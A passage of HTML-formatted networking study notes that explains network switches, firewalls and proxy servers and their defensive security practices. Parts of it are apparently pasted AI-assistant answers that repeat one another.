<li>
<p><strong>Auto-Negotiation</strong>: Most modern switches support auto-negotiation, allowing devices to automatically determine and configure their optimal speed and duplex settings.</p>
</li>
<li>
<p><strong>Quality of Service (QoS)</strong>: Advanced switches often include QoS features that prioritize certain types of traffic over others, ensuring that critical applications receive the necessary bandwidth and low latency.</p>
</li>
<li>
<p><strong>Security Features</strong>: Some switches provide security features such as port security, which allows administrators to restrict which devices can connect to specific switch ports.</p>
</li>
</ol>
<p>Network switches are essential for creating efficient and well-organized local area networks. They are responsible for directing traffic to its intended destination, reducing network collisions, and improving network performance. Switches come in various sizes and types, from small desktop switches for home networks to large enterprise-grade switches for data centers and corporate networks.</p>
<p>A network switch is a device that connects multiple devices together on a computer network, allowing them to communicate with each other. It operates at Layer 2 (Data Link) of the OSI model, which is responsible for physical and logical addressing.</p>
<p><strong>How Switches Work</strong></p>
<p>Switches work by filtering and forwarding data packets between connected devices. When a device sends a data packet, the switch identifies the destination device's MAC address (Media Access Control address) and forwards the packet to the corresponding port connected to that device.</p>
<p>To achieve this, switches maintain a MAC address table, which maps MAC addresses to physical ports. As devices connect to the switch, their MAC addresses are learned and added to the table. When a packet arrives, the switch checks the destination MAC address against the table and forwards it to the appropriate port.</p>
<p>Switches operate in full-duplex mode, meaning they can send and receive data simultaneously on each port. This allows for efficient data transfer and reduces network congestion.</p>
<p><strong>Types of Network Switches</strong></p>
<p>There are various types of network switches, each with its own capabilities and applications. Some common types include:</p>
<ul>
<li>
<p><strong>Unmanaged switches:</strong> These are basic switches that provide simple connectivity without advanced features or configuration options. They are typically used in small networks or home environments.</p>
</li>
<li>
<p><strong>Managed switches:</strong> These offer more advanced features, such as VLANs (Virtual Local Area Networks), QoS (Quality of Service), and SNMP (Simple Network Management Protocol). They allow for greater control and customization, making them suitable for larger networks or critical environments.</p>
</li>
<li>
<p><strong>Gigabit Ethernet switches:</strong> These switches support Gigabit Ethernet speeds, allowing for high-speed data transfer rates of up to 1 Gbps. They are commonly used in enterprise networks and data centers.</p>
</li>
<li>
<p><strong>PoE (Power over Ethernet) switches:</strong> These switches provide power over the Ethernet cable, allowing connected devices to receive power without the need for separate power adapters. They are often used for devices such as IP cameras, VoIP phones, and wireless access points.</p>
</li>
</ul>
<p><strong>Benefits of Network Switches</strong></p>
<p>Network switches offer several benefits, including:</p>
<ul>
<li>
<p><strong>Improved network performance:</strong> By forwarding data directly to the intended destination, switches reduce network congestion and improve overall network efficiency.</p>
</li>
<li>
<p><strong>Reduced network collisions:</strong> Switches eliminate collisions, which occur when multiple devices attempt to transmit data simultaneously on a shared network.</p>
</li>
<li>
<p><strong>Increased network flexibility:</strong> Switches allow for flexible network segmentation, enabling the creation of separate workgroups or departments within a larger network.</p>
</li>
<li>
<p><strong>Simplified network management:</strong> Switches simplify network management by providing a centralized point of control for connecting and configuring devices.</p>
</li>
</ul>
<p><strong>Conclusion</strong></p>

<p>Switch security refers to the practices and configurations implemented on network switches to safeguard your network from unauthorized access, malicious activities, and potential vulnerabilities. While switches aren't the sole line of defense, they play a crucial role in network security. Here's an overview of key aspects of switch security:</p>
<p><strong>Common Security Threats:</strong></p>
<ul>
<li><strong>Unauthorized Access:</strong> Attackers might try to gain access to your network through unauthorized devices or spoofing techniques.</li>
<li><strong>Data Theft:</strong> Once on the network, attackers can steal sensitive information like passwords or financial data.</li>
<li><strong>Denial-of-Service (DoS) Attacks:</strong> These attacks flood the network with traffic, preventing legitimate users from accessing resources.</li>
<li><strong>Man-in-the-Middle (MitM) Attacks:</strong> Attackers intercept communication between devices on the network, potentially eavesdropping or manipulating data.</li>
</ul>
<p><strong>Best Practices for Switch Security:</strong></p>
<ul>
<li><strong>Disable unused ports:</strong> This prevents attackers from exploiting vulnerabilities on inactive ports.</li>
<li><strong>Implement Port Security:</strong>
<ul>
<li>Limit the number of allowed MAC addresses per port.</li>
<li>Restrict access to specific MAC addresses (static or learned dynamically).</li>
<li>Configure violation modes to respond to unauthorized access attempts (shut down port, log events, etc.).</li>
</ul>
</li>
<li><strong>Enable Strong Authentication:</strong> Use complex passwords, multi-factor authentication (MFA), and role-based access control (RBAC) to restrict access to switch configuration and management.</li>
<li><strong>Apply Security Patches:</strong> Regularly update firmware on your switch to patch any known vulnerabilities.</li>
<li><strong>Segment the Network:</strong> Use VLANs (Virtual Local Area Networks) to logically separate network segments, limiting network traffic flow and potential impact of a breach.</li>
<li><strong>Monitor Network Activity:</strong> Regularly monitor network traffic for suspicious activity and potential security threats.</li>
</ul>
<p><strong>Additional Security Features:</strong></p>
<ul>
<li><strong>Storm Control:</strong> Prevents DoS attacks by limiting the number of broadcasts, multicasts, and unicast packets per port.</li>
<li><strong>DHCP Snooping:</strong> Helps prevent unauthorized devices from obtaining IP addresses from the DHCP server.</li>

</ul>
<p>Switch security is crucial for maintaining the integrity, confidentiality, and availability of network resources. Here are some key considerations for securing switches:</p>
<ol>
<li>
<p><strong>Physical Security</strong>: Ensure that switches are physically secured in a locked cabinet or room to prevent unauthorized access or tampering.</p>
</li>
<li>
<p><strong>Port Security</strong>: Implement port security features such as MAC address filtering, which restricts access to switch ports based on the MAC addresses of connected devices. This helps prevent unauthorized devices from connecting to the network.</p>
</li>
<li>
<p><strong>VLANs (Virtual Local Area Networks)</strong>: Segment the network into VLANs to isolate traffic and restrict access between different parts of the network. This helps contain security breaches and limit the scope of potential attacks.</p>
</li>
<li>
<p><strong>Access Control Lists (ACLs)</strong>: Use ACLs to control traffic entering or leaving the switch based on criteria such as IP addresses, port numbers, or protocols. ACLs can be used to enforce security policies and restrict access to specific services or resources.</p>
</li>
<li>
<p><strong>Secure Management Interfaces</strong>: Enable strong authentication mechanisms such as SSH (Secure Shell) or HTTPS (Hypertext Transfer Protocol Secure) for accessing the switch's management interface. Change default passwords and use strong, unique passwords for administrative accounts.</p>
</li>
<li>
<p><strong>Firmware Updates</strong>: Regularly update the switch firmware to patch security vulnerabilities and ensure that the device is running the latest software with the latest security fixes.</p>
</li>
<li>
<p><strong>Logging and Monitoring</strong>: Enable logging on the switch to record events such as configuration changes, authentication attempts, and security incidents. Monitor logs regularly for signs of unauthorized activity or security breaches.</p>
</li>
<li>
<p><strong>Port Security Features</strong>: Utilize features like IEEE 802.1X port-based authentication to control access to switch ports based on user credentials. This ensures that only authorized users can connect to the network.</p>
</li>
<li>
<p><strong>Disable Unused Ports</strong>: Disable unused switch ports to prevent unauthorized devices from connecting to the network through unused ports.</p>
</li>
<li>
<p><strong>STP (Spanning Tree Protocol) Protection</strong>: Implement STP protection mechanisms such as BPDU (Bridge Protocol Data Unit) Guard and Root Guard to prevent STP-related attacks such as spoofing and manipulation.</p>
</li>
<li>
<p><strong>DHCP Snooping</strong>: Enable DHCP snooping to prevent rogue DHCP servers from distributing incorrect IP configuration information to clients. DHCP snooping validates DHCP messages and ensures that only authorized DHCP servers are allowed to assign IP addresses.</p>
</li>
<li>
<p><strong>Port Mirroring</strong>: Use port mirroring to monitor network traffic for security analysis, intrusion detection, and troubleshooting purposes.</p>
</li>
</ol>
<p>By implementing these security measures, you can help safeguard your switch infrastructure against various security threats and ensure the confidentiality, integrity, and availability of your network resources.</p>

<p>Certainly! Here are examples of different types of switches commonly used in networking:</p>
<ol>
<li>
<p><strong>Ethernet Switch</strong>: This is the most common type of switch used in local area networks (LANs). Ethernet switches forward Ethernet frames between connected devices based on their MAC addresses, allowing multiple devices to communicate within the same network segment.</p>
</li>
<li>
<p><strong>Managed Switch</strong>: A managed switch provides more advanced features compared to unmanaged switches. It allows network administrators to configure settings such as VLANs, Quality of Service (QoS), port mirroring, and port security, providing greater control and flexibility over network traffic.</p>
</li>
<li>
<p><strong>Unmanaged Switch</strong>: An unmanaged switch operates out of the box with no configuration required. It simply forwards data between connected devices without any advanced features. Unmanaged switches are typically used in small home or office networks where simplicity is preferred over configurability.</p>
</li>
<li>
<p><strong>Layer 2 Switch</strong>: A Layer 2 switch operates at the data link layer (Layer 2) of the OSI model and makes forwarding decisions based on MAC addresses. These switches are efficient at forwarding traffic within the same subnet but do not perform routing between different subnets.</p>
</li>
<li>
<p><strong>Layer 3 Switch</strong>: A Layer 3 switch combines the functionality of a switch and a router. In addition to forwarding based on MAC addresses (Layer 2), Layer 3 switches can also route traffic based on IP addresses (Layer 3). This allows them to interconnect multiple subnets within a network.</p>
</li>
<li>
<p><strong>PoE Switch (Power over Ethernet)</strong>: A PoE switch provides power to connected devices such as IP phones, wireless access points, and IP cameras over the Ethernet cable, eliminating the need for separate power adapters. This simplifies installation and reduces cable clutter in environments where power outlets are not readily available.</p>
</li>
<li>
<p><strong>Stackable Switch</strong>: Stackable switches allow multiple switches to be interconnected and managed as a single logical unit. This simplifies network management and provides scalability by allowing additional switches to be added to the stack as the network grows.</p>
</li>
<li>
<p><strong>Distribution Switch</strong>: A distribution switch is typically deployed in the distribution layer of a hierarchical network design. It connects multiple access switches to the core network and performs functions such as VLAN routing, access control, and Quality of Service (QoS) enforcement.</p>
</li>
<li>
<p><strong>Access Switch</strong>: An access switch provides network connectivity to end-user devices such as computers, printers, and IP phones. It typically connects to the distribution switch and provides access to network resources within the local subnet.</p>
</li>
<li>
<p><strong>Industrial Switch</strong>: Industrial switches are ruggedized switches designed for use in harsh environments such as factories, warehouses, and outdoor installations. They are built to withstand extreme temperatures, humidity, vibration, and electromagnetic interference.</p>
</li>
</ol>
<p>These are just a few examples of switches, and there are many other specialized switches designed for specific use cases or industries. Each type of switch serves a different purpose and offers unique features to meet the requirements of various network environments.</p>
<h2 id="network-switch-examples"><a class="header" href="#network-switch-examples">Network Switch Examples</a></h2>
<p>Network switches are devices that connect multiple computers and other network devices, allowing data to flow between them efficiently. They are essential for creating and managing computer networks of all sizes, from small home networks to large enterprise networks. Here are a few examples of different types of network switches:</p>
<ul>
<li>
<p><strong>Unmanaged Network Switch:</strong> These are the most basic and affordable type of network switch. They offer plug-and-play functionality and require no configuration. They are a good option for small home networks where simplicity is desired.</p>
</li>
<li>
<p><strong>Managed Network Switch:</strong> These switches offer more advanced features than unmanaged switches, such as VLAN support, port security, and traffic control. They are more complex to configure but provide greater control over the network. Managed switches are typically used in business and enterprise networks.</p>
</li>
<li>
<p><strong>PoE (Power over Ethernet) Switch:</strong> These switches can provide power to devices connected over the network, eliminating the need for separate power supplies. This is useful for devices such as IP phones, security cameras, and wireless access points.</p>
</li>
<li>
<p><strong>KVM Switch:</strong> A KVM switch (Keyboard, Video, Mouse switch) allows you to control multiple computers using a single keyboard, monitor, and mouse. This is useful for system administrators who need to manage multiple servers.</p>
</li>
</ul>
<p>The specific type of network switch that you need will depend on the size and complexity of your network, as well as your specific needs and budget.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="firewall"><a class="header" href="#firewall">Firewall</a></h1>
<p>A firewall is a network security device or software application that acts as a barrier between a trusted internal network (such as a corporate network or a home network) and untrusted external networks (like the internet). The primary purpose of a firewall is to control incoming and outgoing network traffic, allowing or blocking specific data packets based on predefined security rules. Here's how a firewall works and its key functions:</p>
<ol>
<li>
<p><strong>Packet Filtering</strong>: Firewalls inspect individual data packets, examining information such as source and destination IP addresses, port numbers, and protocols. The firewall then uses predefined rules to determine whether to permit or block each packet.</p>
</li>
<li>
<p><strong>Stateful Inspection</strong>: Some modern firewalls use stateful inspection (also known as dynamic packet filtering) to keep track of the state of active connections. This approach allows the firewall to make decisions based on the state of the connection, not just individual packets. For example, it can remember outbound requests and allow corresponding inbound responses.</p>
</li>
<li>
<p><strong>Access Control Lists (ACLs)</strong>: Firewalls use access control lists (ACLs) to specify what types of traffic are allowed or denied. These rules can be based on various criteria, including IP addresses, port numbers, and protocols. Administrators configure these rules to define the security policies of the network.</p>
</li>
<li>
<p><strong>Proxying and Network Address Translation (NAT)</strong>: Firewalls can act as proxies or perform Network Address Translation (NAT). In proxy mode, they act as intermediaries between internal users and external resources, protecting the internal network. NAT is used to hide internal network addresses from external networks and allows multiple internal devices to share a single public IP address.</p>
</li>
<li>
<p><strong>Application Layer Filtering</strong>: Some firewalls offer deep packet inspection, which examines the contents of data packets at the application layer. This allows them to detect and block certain types of content or applications, such as specific websites, protocols, or malware.</p>
</li>
<li>
<p><strong>Intrusion Detection and Prevention</strong>: Many firewalls are integrated with intrusion detection systems (IDS) and intrusion prevention systems (IPS). These systems monitor network traffic for signs of suspicious or malicious activity and can take action to block or prevent potential threats.</p>
</li>
<li>
<p><strong>Logging and Reporting</strong>: Firewalls typically log network traffic and security events. Network administrators can review these logs to identify security incidents, track network usage, and ensure compliance with security policies.</p>
</li>
<li>
<p><strong>Stateless and Stateful Firewalls</strong>: Stateless firewalls filter packets based on individual criteria without considering the state of the connection. Stateless firewalls are simpler and faster but provide less context-aware security. Stateful firewalls, as mentioned earlier, keep track of the state of connections, which allows for more sophisticated security rule enforcement.</p>
</li>
<li>
<p><strong>Security Zones</strong>: Firewalls often support the concept of security zones, where network segments are classified into different levels of trust. Security policies are then defined for traffic moving between these zones.</p>
</li>
<li>
<p><strong>Virtual Private Network (VPN) Support</strong>: Many firewalls support VPNs, allowing secure remote access to the network and secure data transfer between remote locations.</p>
</li>
</ol>
<p>Firewalls are a critical component of network security, protecting networks from unauthorized access, cyberattacks, and other security threats. They serve as the first line of defense in securing sensitive data and network resources. Firewalls can be implemented as dedicated hardware appliances, software applications, or cloud-based services, depending on the specific security requirements of an organization or network.</p>
<p>A firewall is a network security device that monitors and controls incoming and outgoing network traffic based on a set of predefined rules. It functions as a barrier between a trusted internal network and an untrusted external network, such as the Internet. Firewalls act as gatekeepers, scrutinizing each incoming and outgoing packet of data to determine whether to allow it to pass through or not.</p>
<p><strong>How Firewalls Work</strong></p>
<p>Firewalls operate by analyzing the source and destination addresses, ports, protocols, and other information contained in network packets. They compare this information against a set of security rules configured by the network administrator. If a packet matches a rule that permits access, the firewall allows it to pass through. If a packet matches a rule that denies access, the firewall blocks it, preventing unauthorized communication.</p>
<p>There are two main types of firewalls: packet filtering firewalls and stateful inspection firewalls.</p>
<ul>
<li>
<p><strong>Packet filtering firewalls:</strong> These firewalls examine the header information of each packet, including the source and destination addresses, ports, and protocols. They make decisions based on this information, allowing or blocking packets accordingly.</p>
</li>
<li>
<p><strong>Stateful inspection firewalls:</strong> These firewalls go beyond packet headers and inspect the contents of packets to make more granular decisions. They track the state of ongoing connections and use this information to filter traffic more effectively.</p>
</li>
</ul>
<p><strong>Firewall Rules</strong></p>
<p>Firewall rules are the cornerstone of firewall security. They define the criteria that the firewall uses to evaluate incoming and outgoing traffic. Rules can be based on various factors, such as:</p>
<ul>
<li>
<p><strong>Source and destination IP addresses:</strong> Firewalls can restrict traffic based on the IP addresses of the devices sending and receiving data. This can prevent unauthorized access from specific networks or devices.</p>
</li>
<li>
<p><strong>Ports:</strong> Firewalls can restrict traffic based on the ports used by applications. This can block specific applications or services from accessing the network.</p>
</li>
<li>
<p><strong>Protocols:</strong> Firewalls can restrict traffic based on the network protocols used, such as TCP, UDP, or ICMP. This can prevent certain types of traffic from entering or leaving the network.</p>
</li>
<li>
<p><strong>Content filtering:</strong> Stateful firewalls can inspect the contents of packets to identify and block malicious traffic, such as viruses, worms, or spyware.</p>
</li>
</ul>
<p><strong>Benefits of Firewalls</strong></p>
<p>Firewalls provide several benefits for network security, including:</p>
<ul>
<li>
<p><strong>Protection against unauthorized access:</strong> Firewalls prevent unauthorized access to the network by blocking traffic that does not meet the defined security rules.</p>
</li>
<li>
<p><strong>Defense against malware:</strong> Firewalls can block malicious traffic, such as viruses, worms, and spyware, preventing them from infecting devices on the network.</p>
</li>
<li>
<p><strong>Controlling network traffic:</strong> Firewalls allow network administrators to control the flow of traffic on the network, preventing unauthorized or excessive use of network resources.</p>
</li>
<li>
<p><strong>Enforcing security policies:</strong> Firewalls help enforce network security policies by ensuring that network traffic adheres to the organization's security guidelines.</p>
</li>
</ul>
<p><strong>Conclusion</strong></p>
<p>Firewalls are essential components of network security, providing a critical layer of protection against unauthorized access, malware, and other threats. They play a vital role in safeguarding sensitive data and maintaining the integrity of networks. By implementing and configuring firewalls effectively, organizations can significantly enhance their overall network security posture.</p>
<p>GitHub Copilot: A firewall is a network security device that monitors and filters incoming and outgoing network traffic based on an organization's previously established security policies. At its most basic, a firewall is essentially the barrier that sits between a private internal network and the public Internet.</p>
<p>Here's a simplified explanation of how a firewall works:</p>
<ol>
<li>
<p><strong>Establishing Firewall Security Policies</strong>: The first step in configuring a firewall is to establish the security policies that it will use to permit or deny network traffic. These policies are often based on IP addresses, domain names, protocols, programs, ports, and keywords.</p>
</li>
<li>
<p><strong>Packet Filtering</strong>: When data packets attempt to enter the network from the Internet, the firewall first checks the packet's IP address, protocol (like TCP, UDP, ICMP), and port number. If the packet matches an entry in the firewall's filter list, the packet is either forwarded or discarded based on the policy.</p>
</li>
<li>
<p><strong>Stateful Inspection</strong>: Modern firewalls use a method called stateful inspection to examine the contents of packets and monitor the state of the connection. This allows the firewall to block or permit traffic based on the connection state, in addition to the standard IP address and port-based rules.</p>
</li>
<li>
<p><strong>Proxy Service</strong>: Some firewalls also provide a proxy service where they make connection requests on behalf of other machines in the network. This hides the true network addresses of the internal machines.</p>
</li>
<li>
<p><strong>Intrusion Prevention System (IPS)</strong>: Some advanced firewalls also include an Intrusion Prevention System (IPS) that helps detect and prevent attacks from malware and hackers.</p>
</li>
<li>
<p><strong>Logging and Alerts</strong>: Firewalls also typically provide logging and alerting capabilities. They can log traffic data for auditing and troubleshooting, and they can send alerts when they detect potential security threats.</p>
</li>
</ol>
<p>Firewalls can be either hardware or software. Hardware firewalls are standalone devices that are placed between the network and the gateway, while software firewalls are installed on individual machines. Both types have their own advantages and are often used in combination for layered network security.</p>

<p>Firewall security is a critical aspect of network defense, serving as a barrier between an organization's internal network and external threats. Here are some key considerations for firewall security:</p>
<ol>
<li>
<p><strong>Access Control</strong>: Implement strict access control policies to allow only authorized traffic to enter or leave the network. This involves defining rules based on IP addresses, ports, protocols, and application signatures to permit or deny traffic.</p>
</li>
<li>
<p><strong>Stateful Inspection</strong>: Use stateful inspection, also known as dynamic packet filtering, to track the state of active connections and allow only legitimate traffic that matches established connection parameters. This helps prevent attacks like IP spoofing and ensures that incoming packets belong to established sessions.</p>
</li>
<li>
<p><strong>Application Layer Filtering</strong>: Employ application layer filtering to inspect and control traffic based on specific application protocols (e.g., HTTP, FTP, SMTP). This allows firewall policies to be enforced at a more granular level, providing better protection against application-layer attacks and unauthorized access.</p>
</li>
<li>
<p><strong>Intrusion Prevention System (IPS)</strong>: Integrate intrusion prevention capabilities into the firewall to detect and block known and emerging threats in real-time. IPS functionality can identify malicious patterns and behaviors within network traffic, providing proactive defense against various attacks such as exploits, malware, and DoS (Denial of Service) attacks.</p>
</li>
<li>
<p><strong>VPN (Virtual Private Network) Support</strong>: Enable VPN functionality to secure remote access and interconnect branch offices or remote sites over encrypted tunnels. VPNs provide confidentiality, integrity, and authenticity for data transmitted between endpoints, protecting sensitive information from interception or tampering.</p>
</li>
<li>
<p><strong>Logging and Monitoring</strong>: Enable firewall logging to record security events, traffic patterns, and policy violations for analysis and audit purposes. Monitoring firewall logs allows administrators to identify suspicious activities, troubleshoot network issues, and ensure compliance with security policies and regulations.</p>
</li>
<li>
<p><strong>Regular Updates</strong>: Keep firewall firmware, software, and security definitions up-to-date to mitigate vulnerabilities and protect against emerging threats. Manufacturers release patches and updates to address security vulnerabilities, so it's crucial to apply them promptly to maintain the effectiveness of firewall defenses.</p>
</li>
<li>
<p><strong>Default Deny Policy</strong>: Implement a default deny policy to block all incoming and outgoing traffic by default and explicitly allow only necessary services and applications. This approach minimizes the attack surface and reduces the risk of unauthorized access or exploitation of network resources.</p>
</li>
<li>
<p><strong>High Availability and Redundancy</strong>: Deploy firewall solutions in high availability configurations with failover mechanisms to ensure continuous protection and uninterrupted network connectivity in the event of hardware failures or network outages.</p>
</li>
<li>
<p><strong>Security Awareness and Training</strong>: Educate users about the importance of firewall security, safe internet usage practices, and the potential risks associated with unauthorized access attempts, phishing attacks, and malware infections. Security awareness training helps foster a security-conscious culture and empowers users to recognize and report security threats effectively.</p>
</li>
</ol>
<p>By implementing these best practices, organizations can enhance the effectiveness of their firewall defenses and strengthen their overall cybersecurity posture against a wide range of threats and attacks.</p>

<p>GitHub Copilot: A proxy server, often referred to as just a proxy, is a server that acts as an intermediary for requests from clients seeking resources from other servers. It allows you to go online under a different IP address identity.</p>
<p>Here's a simplified explanation of how a proxy server works:</p>
<ol>
<li>
<p><strong>Client Connection</strong>: When a client (for example, your computer) connects to a proxy server and requests a resource (like a webpage), it's asking the proxy server to forward the request on its behalf.</p>
</li>
<li>
<p><strong>Request Forwarding</strong>: The proxy server forwards this request to the target server that hosts the resource. This means that the target server does not directly receive the request from the client. Instead, it receives the request from the proxy server, which it treats as the origin of the request.</p>
</li>
<li>
<p><strong>Response Relay</strong>: The target server sends the response back to the proxy server, which then forwards it to the client. The client is unaware that the response came from the target server via the proxy server.</p>
</li>
</ol>
<p>Key features and uses of proxy servers include:</p>
<ul>
<li>
<p><strong>Anonymity</strong>: Since the target server only sees the proxy server's information, the client's information is kept private. This can be used for anonymous browsing.</p>
</li>
<li>
<p><strong>Access Control</strong>: Proxy servers can provide access control, blocking certain websites or certain types of requests.</p>
</li>
<li>
<p><strong>Caching</strong>: Proxy servers can cache (store a copy of) popular websites. When a cached webpage is requested, the proxy server can send it without having to forward the request to the actual server that hosts the webpage, improving performance.</p>
</li>
<li>
<p><strong>Load Balancing</strong>: Proxy servers can distribute client requests across multiple servers to balance load and improve responsiveness.</p>
</li>
<li>
<p><strong>Content Filtering</strong>: Proxy servers can also be used to filter requests to ensure that no inappropriate content is returned to the client.</p>
</li>
</ul>
<p>Remember, while proxy servers can provide security and privacy benefits, they should be used responsibly and in accordance with all applicable laws and ethical guidelines.</p>
<p>A proxy server is a network device or software application that acts as an intermediary between clients (such as users' devices) and servers on the internet. It works by forwarding client requests to the appropriate servers and returning the server's responses to clients. Proxy servers serve various purposes, including improving security, performance, and privacy. Here's how a proxy server works and its key functions:</p>
<ol>
<li>
<p><strong>Client Requests</strong>: When a client, such as a web browser, requests access to a web server, it sends the request directly to the proxy server instead of connecting directly to the target server.</p>
</li>
<li>
<p><strong>Proxy Server Evaluation</strong>: The proxy server evaluates the client's request, which may include details like the requested web address (URL), and applies predefined rules and policies to determine how to handle the request.</p>
</li>
<li>
<p><strong>Request Forwarding</strong>: Depending on the rules and policies, the proxy server can forward the client's request to the target server. This is known as forward proxying. The client believes it is communicating directly with the target server.</p>
</li>
<li>
<p><strong>Caching</strong>: Some proxy servers can cache frequently accessed web content. If the requested content is already cached, the proxy server can serve it directly to the client, reducing the load on the target server and improving response times. This is particularly useful for static content, like images and stylesheets.</p>
</li>
<li>
<p><strong>Security and Filtering</strong>: Proxy servers can be used for security and content filtering. They can block access to malicious websites, filter out unwanted content, and enforce content policies for organizations.</p>
</li>
<li>
<p><strong>Anonymity and Privacy</strong>: Proxy servers can enhance privacy by masking the client's IP address. When a client uses an anonymous proxy, the target server sees the proxy server's IP address instead of the client's, helping to hide the client's identity.</p>
</li>
<li>
<p><strong>Load Balancing</strong>: Some proxy servers, known as reverse proxies, are placed in front of a server or server farm to distribute client requests evenly among multiple backend servers. This enhances server performance and availability.</p>
</li>
<li>
<p><strong>Access Control</strong>: Proxy servers can enforce access control policies, ensuring that only authorized users or devices are allowed to access specific resources.</p>
</li>
<li>
<p><strong>Authentication</strong>: Users may be required to authenticate themselves to the proxy server before gaining access to specific resources. This can include username and password authentication or other methods like client certificates.</p>
</li>
<li>
<p><strong>Monitoring and Logging</strong>: Proxy servers often log client activities and traffic, allowing administrators to monitor network usage, track potential security incidents, and analyze user behavior.</p>
</li>
<li>
<p><strong>Content Modification</strong>: Some proxy servers can modify content on the fly. For example, they can compress content to reduce bandwidth usage, inject JavaScript for tracking or security purposes, or transform web content for optimal viewing on mobile devices.</p>
</li>
</ol>
<p>Proxy servers come in various types, such as forward proxies, reverse proxies, open proxies, and transparent proxies, each serving different purposes. They are commonly used in organizations to enhance security and performance, and also by individuals seeking privacy and anonymity online. The choice of a proxy server and its configuration depends on the specific use case and requirements.</p>

<p>A proxy server is an intermediary server that sits between a client computer and the internet. When a client requests a web page or other resource, the request is first sent to the proxy server. The proxy server then checks its cache to see if it has a copy of the requested resource. If it does, it sends the cached copy to the client. If it does not, it forwards the request to the internet and sends the response back to the client.</p>
<p><strong>How Proxy Servers Work</strong></p>
<p>Proxy servers work by intercepting and filtering network traffic between a client computer and the internet. They act as intermediaries, hiding the client's IP address from the websites it visits and providing a layer of security and anonymity.</p>
<p>When a client requests a website, for example, the request is first sent to the proxy server. The proxy server then examines the request and makes a decision on how to handle it. There are three main scenarios:</p>
<ul>
<li>
<p><strong>Cached Response:</strong> If the proxy server already has a copy of the requested website (cached content), it sends the cached copy directly to the client. This speeds up the process, as the website doesn't need to be downloaded from the internet again.</p>
</li>
<li>
<p><strong>Forwarded Request:</strong> If the proxy server doesn't have a cached copy of the requested website, it forwards the request to the internet on behalf of the client. The proxy server receives the response from the website and forwards it back to the client.</p>
</li>
<li>
<p><strong>Blocked Request:</strong> In some cases, the proxy server may block the request altogether. This could be because the website is known to be malicious or because it violates the organization's content filtering policies.</p>
</li>
</ul>
<p><strong>Types of Proxy Servers</strong></p>
<p>There are different types of proxy servers, each serving a specific purpose:</p>
<ul>
<li>
<p><strong>Transparent Proxy Servers:</strong> These act as transparent intermediaries, replacing the client's IP address with their own when making requests. The websites don't know the client's actual IP address, providing a level of anonymity.</p>
</li>
<li>
<p><strong>Anonymous Proxy Servers:</strong> These hide the client's IP address from the websites they visit, but not from the proxy server itself. This can be useful for accessing websites that block certain IP addresses.</p>
</li>
<li>
<p><strong>Filtering Proxy Servers:</strong> These block access to certain types of websites or content, based on predefined rules. They are often used in organizations to enforce content filtering policies.</p>
</li>
<li>
<p><strong>Reverse Proxy Servers:</strong> These receive requests from the internet and forward them to internal servers within an organization. They can be used to load balance traffic and improve website performance.</p>
</li>
<li>
<p><strong>Caching Proxy Servers:</strong> These store copies of frequently accessed websites, reducing the need to download them repeatedly from the internet. They improve website loading times and reduce bandwidth usage.</p>
</li>
</ul>
<p><strong>Benefits of Proxy Servers</strong></p>
<p>Proxy servers offer several benefits, including:</p>
<ul>
<li>
<p><strong>Improved performance:</strong> Proxy servers can cache frequently accessed websites, reducing the need to download them from the internet repeatedly. This can improve website loading times and reduce bandwidth usage.</p>
</li>
<li>
<p><strong>Enhanced security:</strong> Proxy servers can filter out malicious traffic, such as viruses and malware, protecting client computers from infections.</p>
</li>
<li>
<p><strong>Increased anonymity:</strong> Proxy servers can hide the client's IP address from the websites they visit, providing a level of privacy and anonymity.</p>
</li>
<li>
<p><strong>Content filtering:</strong> Proxy servers can be used to enforce content filtering policies, blocking access to certain types of websites or content.</p>
</li>
<li>
<p><strong>Load balancing:</strong> Proxy servers can distribute incoming traffic across multiple servers, improving the overall performance and scalability of websites.</p>
</li>
</ul>
<p><strong>Conclusion</strong></p>
<p>Proxy servers are versatile tools that play a valuable role in network security, performance, and content filtering. They provide a layer of protection between client computers and the internet, enhancing privacy, reducing bandwidth usage, and enforcing content filtering policies. As the internet continues to evolve, proxy servers will remain an essential component of network infrastructure.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="proxy-security"><a class="header" href="#proxy-security">Proxy security</a></h1>
<p>Proxy servers play a significant role in enhancing security by acting as intermediaries between clients and the internet. However, they also introduce potential security risks if not properly configured or managed. Here are some key considerations for proxy server security:</p>
<ol>
<li>
<p><strong>Access Control</strong>: Implement strict access controls to restrict access to the proxy server. Use authentication mechanisms such as username/password, client certificates, or integration with identity providers (e.g., LDAP, Active Directory) to authenticate users and enforce access policies based on roles and permissions.</p>
</li>
<li>
<p><strong>Logging and Monitoring</strong>: Enable logging and monitoring capabilities to record and analyze proxy server activities, including user authentication events, access attempts, traffic patterns, and security incidents. Regularly review logs to identify suspicious activities, policy violations, or anomalies that may indicate unauthorized access or malicious behavior.</p>
</li>
<li>
<p><strong>Data Encryption</strong>: Encrypt communication channels between clients and the proxy server to protect sensitive information from eavesdropping and interception. Use secure protocols such as HTTPS (SSL/TLS) for web proxy traffic and IPsec or TLS for VPN-based proxy solutions to ensure confidentiality and integrity of data in transit.</p>
</li>
<li>
<p><strong>Content Filtering</strong>: Implement content filtering capabilities to block access to malicious or inappropriate websites, malware-infected content, phishing sites, and other security threats. Use URL filtering, category-based filtering, and signature-based detection techniques to enforce acceptable use policies and prevent users from accessing harmful or unauthorized content.</p>
</li>
<li>
<p><strong>Anti-Malware Protection</strong>: Integrate anti-malware and antivirus scanning capabilities into the proxy server to inspect inbound and outbound web traffic for malware signatures, suspicious file attachments, and malicious payloads. Use real-time scanning engines, heuristic analysis, and sandboxing techniques to detect and quarantine malware threats before they reach endpoints.</p>
</li>
<li>
<p><strong>Data Loss Prevention (DLP)</strong>: Deploy data loss prevention mechanisms to prevent unauthorized data exfiltration and leakage through the proxy server. Implement content-aware policies to monitor and control sensitive data transfers, file uploads, and communications, and enforce encryption, redaction, or blocking based on predefined rules and classifications.</p>
</li>
<li>
<p><strong>Authentication Bypass Prevention</strong>: Guard against authentication bypass attacks and session hijacking attempts by enforcing strong authentication mechanisms, session management controls, and secure cookie handling practices. Implement measures such as session timeouts, CSRF (Cross-Site Request Forgery) protection, and IP-based access restrictions to mitigate the risk of unauthorized access to authenticated sessions.</p>
</li>
<li>
<p><strong>Regular Updates and Patch Management</strong>: Keep the proxy server software, firmware, and security components up-to-date with the latest patches, updates, and security fixes to address known vulnerabilities and protect against emerging threats. Establish a formal patch management process to assess, test, and deploy updates in a timely manner without disrupting service availability.</p>
</li>
<li>
